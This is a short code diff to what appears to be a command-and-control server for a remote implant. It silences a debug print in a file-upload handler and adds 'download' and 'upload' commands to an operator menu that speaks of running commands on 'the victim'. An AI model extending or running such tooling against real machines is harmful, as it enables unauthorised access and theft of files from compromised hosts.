@@ -160,7 +160,7 @@ def getIP(request: Request) -> str:
 async def upload_file(file: str, request: Request):
     client = getIP(request)
     if client == CURRENT_SESSION:
-        print("get upload")
+        #print("get upload")
         data = encodeFile(file)
         return data
 
@@ -380,6 +380,8 @@ def input_thread():
             print("""Run a command on the victim or
     - use \"info\" to see information about the session.
     - use \"getpid\" to get the process ID of the implant.
+    - use \"download [file]\" to download a file from the host.
+    - use \"upload\" [file] [destination] to upload a file to the host.
     - use \"back\" to background the session.
     - use \"kill\" to kill the implant.
     - use \"history\" to view command history.
